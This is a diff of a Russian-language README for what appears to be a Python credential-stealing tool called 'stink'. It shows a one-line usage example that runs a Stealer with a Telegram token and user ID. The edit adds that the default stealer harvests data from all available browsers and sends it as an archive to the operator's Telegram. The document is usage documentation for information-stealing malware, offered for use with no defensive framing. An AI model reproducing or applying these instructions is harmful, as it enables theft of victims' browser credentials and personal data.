@@ -40,7 +40,7 @@ from stink.multistealer import Stealer
 
 Stealer(token="YOUR_TOKEN", user_id=YOUR_ID).run()
 ```
-Стандартный ```Stealer``` запускает сбор по всем доступным браузерам.
+Стандартный ```Stealer``` запускает сбор по всем доступным браузерам и отправляет собранные данные архивом вам в Telegram.
 
 ### Кастомный
 ```python
